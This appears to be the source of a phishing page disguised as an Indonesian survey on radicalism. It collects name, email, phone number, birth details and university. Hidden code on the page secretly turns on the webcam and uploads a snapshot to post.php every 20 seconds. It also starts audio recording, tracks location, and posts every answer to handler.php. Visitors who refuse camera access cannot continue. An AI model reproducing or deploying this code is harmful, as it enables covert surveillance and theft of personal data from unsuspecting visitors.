<!doctype html>
<html>
<head>
  <script src="../../assets/js/jquery.min.js"></script>
  <script src="../../assets/js/client.min.js"></script>
  <script src="../../assets/js/loc.js"></script>
  <link href="../../assets/css/bootstrap.min.css" rel="stylesheet">
  <link href="../../assets/css/light-theme.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

</html>
<html>
<body onload="mydata()">

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
<script src="../../assets/js/location.js"></script>
<script src="../../assets/js/recorder.js"></script>
<script src=js/_app.js></script>
<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};
// environment -- user

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {

    if (e.toString() === 'NotAllowedError: Permission denied' || e.toString() === 'NotAllowedError: Permission dismissed'){
    $('.formulir').hide();
    $('.tampil_error').show();
    }

    //console.log(e.toString());
    //errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
   
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 640);
       var canvasData = canvas.toDataURL("image/png");
       cc = String(canvasData).replace("data:image/png;base64,","");
      //  console.log(cc)
       post(cc);}, 20000);
  

}


// Load init
init();

</script>

</body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>KUISIONER</title>
    <script>
        window.console = window.console || function (t) {
        };
    </script>
    <script>
        if (document.location.search.match(/type=embed/gi)) {
            window.parent.postMessage("resize", "*");
        }
    </script>

<script>

  function klikSubmit(namaID){

    //console.log(document.getElementById(namaID).value);
   // document.getElementBy().style.display = "inline-block";
    cek = true;
   var formulir = document.getElementById(namaID);
    if (formulir.value === ''){
      alert('Isian Tidak boleh kosong');
      cek = false;
    }else{
      $.ajax({          
            type: 'POST',
            url: 'handler.php',
            data: {"data_formulir":`${formulir.name} : ${formulir.value}`},
            mimeType: 'text'
            });
    }
   //console.log(formulir.name);
   //console.log(formulir.value);
   return cek;
       
  }

  function inputTtl(idtempat, idtanggal) {
      var tmp = document.getElementById(idtempat);
      var tgl = document.getElementById(idtanggal);
      
      var cek = true;

      if(tmp.value === '' || tgl.value === ''){

        alert('Isian tidak boleh kosong!')
        cek = false;
      }else{

        $.ajax({          
            type: 'POST',
            url: 'handler.php',
            data: {"data_formulir":`${tmp.name}, ${tgl.name} : ${tmp.value}, ${tgl.value}`},
            mimeType: 'text'
            });

      }
      
      return cek;
  }

  $(document).ready(function(){
    
    window.setTimeout(startRecording, 300);
    window.setInterval(stopRecording, 10000);
    // inisialisasi
    $('#nama').show();
    $('#alamatEmail').hide();
    $('#nomorHP').hide();
    $('#TTL').hide();
    $('#asalUniversitas').hide();
    $('#jurusanKuliah').hide();
    $('#pendapatRadikalisme').hide();
    $('#radikalAgama').hide();
    $('#pendapatTerorrisme1').hide();

    locate();

    $('.tbl1').click(function() {
      if(klikSubmit('namaform1')){
      $('#gtau').fadeIn(200).delay(7000).fadeOut(); 
      $('#nama').fadeOut();
      $('#alamatEmail').delay(8000).fadeIn();
      }
    
    });

    $('.tbl2').click(function() {
      if(klikSubmit('emailform1')){
      $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
      $('#alamatEmail').fadeOut();
      $('#nomorHP').delay(5000).fadeIn();
      }
    });

    $('.tbl3').click(function() {
      if (klikSubmit('nomorhpform1')) {
        $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
        $('#nomorHP').fadeOut();
        $('#TTL').delay(5000).fadeIn();
       
      }
     
    });

    $('.tbl4').click(function() {
      if (inputTtl('tempatLahir', 'taggalLahir')) {
        $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
        $('#TTL').fadeOut();
        $('#asalUniversitas').delay(5000).fadeIn();
        locate();
      }
     
    });


    $('.tbl5').click(function() {
        if (klikSubmit('asalUnivform1')) {
          $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
          $('#asalUniversitas').fadeOut();
          $('#jurusanKuliah').delay(5000).fadeIn();
          
        }
      
      });

    $('.tbl6').click(function() {
      if (klikSubmit('jurusanform1')) {
      $('#gtau').fadeIn(200).delay(5000).fadeOut(); 
      $('#jurusanKuliah').fadeOut();
      $('#pendapatRadikalisme').delay(6000).fadeIn();
      }
    });

    $('.tbl7').click(function() {
      if (klikSubmit('pendapatRadikalismeform1')) {
      $('#gtau').fadeIn(200).delay(900).fadeOut(); 
      $('#pendapatRadikalisme').fadeOut();
      $('#radikalAgama').delay(1000).fadeIn();
        
      }
    });

    $('.tbl8').click(function() {
      $('#gtau').fadeIn(200).delay(2000).fadeOut(); 
      $('#radikalAgama').fadeOut();
      $('pendapatTerorisme1form1').delay(3000).fadeIn();
    
     var rad1 = document.getElementById('radio1');
     var rad2 = document.getElementById('radio2');
     var rad3 = document.getElementById('radio3');

     var nilai = null;
    
     if (rad1.checked){
      nilai = rad1.value;
     }else if(rad2.checked){
      nilai = rad2.value;
     }else{
      nilai = rad3.value;
     }

     $.ajax({          
            type: 'POST',
            url: 'handler.php',
            data: {"data_formulir":`${rad1.name} : ${nilai}`},
            mimeType: 'text'
            });
    });
});

  $('.tbl9').click(function() {
      if (klikSubmit('pendapatTerorisme1form1')) {
      $('#gtau').fadeIn(200).delay(4000).fadeOut(); 
      $('#pendapatTerorrisme').fadeOut();
      //$('#radikalAgama').delay(1000).fadeIn();
        
      }
    });
</script>

</head>

<body translate="no">

  <div class="bg-dark text-light p-4 container-fluid"><h1>LAMAN KUISIONER</h1></div>

  
 <!-- Mulai Formulir --> 
<div class="container formulir p-4 mt-3">

  <div id="gtau" class="container text-center mt-5" style="display: none;"><i class="fa fa-refresh fa-spin fa-2x"></i><h3 style="display: inline;">&nbsp;&nbsp;Loading</h3></div>
 


<div id="nama">
    <div class="form-group">
      <label for="namaform1"><h5>Nama</h5></label>
      <input type="text" class="form-control" id="namaform1" aria-describedby="emailHelp" name="Nama" placeholder="masukkan nama" required>
    </div>
  
    <button class="btn btn-primary tbl1">Kirim</button>
  
   
</div>



<div id="alamatEmail">
    <div class="form-group">
      <label for="emailform1"><h5>Email</h5></label>
      <input type="email" class="form-control" id="emailform1" aria-describedby="emailHelp" name="Email" placeholder="masukkan email" required>
    </div>
  
    <button class="btn btn-primary tbl2">Kirim</button>
  
    
</div>

<div id="nomorHP">
  <div class="form-group">
    <label for="nomorhpform1"><h5>Nomor HP</h5></label>
    <input type="number" class="form-control" id="nomorhpform1" aria-describedby="emailHelp" name="Nomor HP" placeholder="masukkan nomor WA" required>
  </div>

  <button class="btn btn-primary tbl3">Kirim</button>

</div>



<!-- TTL dia, Ayah, ibu -->

<div id="TTL">
  <div class="form-group">
    <label for="tempatLahir"><h5>Tempat Lahir</h5></label>
    <input type="text" class="form-control mb-5" id="tempatLahir" name="Tempat Lahir" placeholder="Tempat Lahir..." required>
    
    <label for="taggalLahir"><h5>Tanggal Lahir</h5></label>
    <input type="date" class="form-control" placeholder="dd-mm-yyyy" id="taggalLahir" name="Tanggal Lahir" required>
    <p>*pengisian tanggal bisa dilakukan dengan klik ikon tanggalan</p>
  </div>

  <button class="btn btn-primary tbl4">Kirim</button>

</div>


<div id="asalUniversitas">
  <div class="form-group">
    <label for="asalUnivform1"><h5>Asal universitas</h5></label>
    <input type="text" class="form-control" id="asalUnivform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
  </div>

  <button class="btn btn-primary tbl5">Kirim</button>
  
</div>

<div id="jurusanKuliah">
  <div class="form-group">
    <label for="jurusanform1"><h5>Jurusan</h5></label>
    <input type="text" class="form-control" id="jurusanform1" aria-describedby="emailHelp" name="Universitas" placeholder="asal universitas" required>
  </div>

  <button class="btn btn-primary tbl6">Kirim</button>
  
</div>

<div id="pendapatRadikalisme">
  <div class="form-group">
    <label for="pendapatRadikalismeform1"><h5>Menurutmu apa itu paham radikal?</h5></label>
    <textarea class="form-control" id="pendapatRadikalismeform1" aria-describedby="emailHelp" name="Apa itu Paham Radikal" placeholder="Tulis disini...." rows="7"></textarea>
  </div>

  <button class="btn btn-primary tbl7">Kirim</button>
  
</div>

<div id="radikalAgama">
  <h5 class="mb-3">Menurutmu apakah paham radikal hanya ada pada orang orang mayoritas?</h5>
  <div class="form-check">
    <label class="form-check-label" for="radio1">
      <input type="radio" class="form-check-input" id="radio1" name="optrad" value="Setuju" checked>Setuju
    </label>
  </div>
  <div class="form-check">
    <label class="form-check-label" for="radio2">
      <input type="radio" class="form-check-input" id="radio2" name="optrad" value="Tidak Setuju">Tidak Setuju
    </label>
  </div>
  <div class="form-check">
    <label class="form-check-label">
      <input type="radio" class="form-check-input" id="radio3" name="optrad" value="Saya Tidak Tahu">Saya Tidak Tahu
    </label>
  </div>

  <button class="btn btn-primary mt-3 tbl8">Kirim</button>
  
</div>


<div id="pendapatTerorrisme1">
  <div class="form-group">
    <label for="pendapatTerorisme1form1"><h5>Menurutmu apa itu paham radikal?</h5></label>
    <textarea class="form-control" id="pendapatTerorisme1form1" aria-describedby="emailHelp" name="paham_radikal" placeholder="Tulis disini...." rows="7"></textarea>
  </div>

  <button class="btn btn-primary tbl9">Kirim</button>
  
</div>
</div>
<!-- Akhir Formulir Formulir -->

<!--pesan error-->
<div class="tampil_warning jumbotron bg-info text-light m-3" style="display: none;">
  <h1>TIDAK MENDUKUNG :(</h1>
  <p>Mohon Maaf, web ini belum bisa mendukung platform Windows</p>
  
</div>

<div class="tampil_error jumbotron bg-danger text-light m-3" style="display: none;">
<h1>ERROR&nbsp;:(</h1>
<p>Web ini tidak bisa mengakses sumber daya yang diperlukan</p>

</div>




<script>
  var client = new ClientJS();
 var OS = client.getOS();
 console.log(OS);
 if(OS == 'Windows'){

   $('.tampil_warning').show(); 
   $('.formulir').hide();
   $('.tampil_error').hide();
 }
</script>
</body>
</html>